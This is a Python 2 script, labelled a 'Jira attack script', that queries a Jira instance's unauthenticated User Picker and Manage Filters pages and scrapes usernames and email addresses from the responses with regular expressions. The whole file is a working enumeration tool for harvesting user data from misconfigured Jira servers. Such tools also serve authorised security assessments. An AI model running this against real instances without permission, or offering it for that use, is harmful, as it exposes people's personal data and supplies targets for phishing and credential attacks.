import re
import sys
from itertools import izip as zip
import argparse
import requests

# argparse definitions
parser = argparse.ArgumentParser(description='Jira attack script')
parser.add_argument('URL', type=str , help='the URL of the Jira instance... ex. https://jira.organization.com/')
parser.add_argument('-u' ,'--usernames', dest='names', action='store_const', const=True, help='Print discovered usernames')
parser.add_argument('-e' , '--emails',   dest='emails',action='store_const', const=True, help='Print discovered email addresses')
parser.add_argument('-a' ,'--all', dest='all',action='store_const',const=True,help='Print discovered email addresses and usernames')
parser.add_argument('-eu' , dest='all',action='store_const',const=True,help=argparse.SUPPRESS)
parser.add_argument('-ue' , dest='all',action='store_const',const=True,help=argparse.SUPPRESS)
args = parser.parse_args()
url = args.URL
if args.URL[-1] != '/':
    args.URL = args.URL + "/"

# Define URLs
pickerURL = args.URL + "secure/popups/UserPickerBrowser.jspa?max=9999"
filtersURL = args.URL + "secure/ManageFilters.jspa?filter=popular"
#dashboardURL = args.URL + "secure/Dashboard.jspa"

def extractPicker(response):
    '''
    Takes in the response body for UserBrowserPicker and returns a dictionary containing
    usernames and email addresses.
    '''
    userList = re.compile(r"-name\">(.*)</td>").findall(response.text)
    emailList = re.compile(r">(.*\@.*)</td>").findall(response.text)
    dictionary = dict(zip(userList , emailList))
    return dictionary

def extractFilters(response):
    '''
    Takes in the response body for the manage filters page and returns a list containing usernames.
    '''
    userList = re.compile(r"</span>.\((.*)\)").findall(response.text)
    return list(set(userList))

def validateURL(url):
    '''
        Runs a stream of validation on a given URL and returns the response and a boolean value.
    '''

    try:
        s = requests.Session()
        validateresponse = s.get(url , allow_redirects=False,timeout=5)
    except requests.exceptions.InvalidSchema:
        print ""
        print "[-] Invalid schema provided... Must follow format https://jira.organization.com/"
        print ""
        sys.exit(1)
    except requests.exceptions.MissingSchema:
        print ""
        print "[-] A supported schema was not provided. Please use http:// or https://"
        print ""
        sys.exit(1)
    except requests.exceptions.InvalidURL:
        print "[-] Invalid base URL was supplied... Please try again."
        sys.exit(1)
    except requests.exceptions.ConnectionError:
        print ""
        print "[-] Connection failed... Please check the URL and try again."
        print ""
        sys.exit(1)
    except requests.exceptions.RequestException:
        print ""
        print "[-] An unknown exception occurred... Please try again."
        print ""
        sys.exit(1)
    if validateresponse.status_code == 200:
        return validateresponse,True
    else:
        return "[-] The page is inaccessible",False

if __name__ == "__main__":
    pickerResponse,pickerAccessible = validateURL(pickerURL)
    filterResponse,filterAccessible = validateURL(filtersURL)

    print ""
    print ""
    print "[+] Checking the User Picker page..."

    if pickerAccessible == True:
        users = extractPicker(pickerResponse)
        print ""
        print "[+] Success..."
        print "[+] Users: "+str(len(users))
        print "[+] Emails: " + str(len(users))
        print ""
        if (args.emails and args.names) or args.all:
            print '{:<20}{:<20}'.format("---Username---", "---------Email---------")
            for username, email in sorted(users.iteritems()):
                print '{:<20}{:<20}'.format(username,email)
        elif args.emails:
            for username,email in sorted(users.iteritems()):
                print email
        elif args.names:
            for username,email in sorted(users.iteritems()):
                print username
        print ""
    elif pickerAccessible == False:
        print pickerResponse

    print ""
    print ""
    print "[+] Checking the Manage Filters page..."

    if filterAccessible == True:
        filterUsers = extractFilters(filterResponse)
        if args.names or args.all:
            if len(filterUsers) == 0:
                print "[-] We could not find any anonymously accessible filters"
                print ""
            else:
                print "[+] The Manage Filters page is accessible and contains data..."
                print ""
                for username in filterUsers:
                    print username
                print ""
    elif filterAccessible == False:
        print filterResponse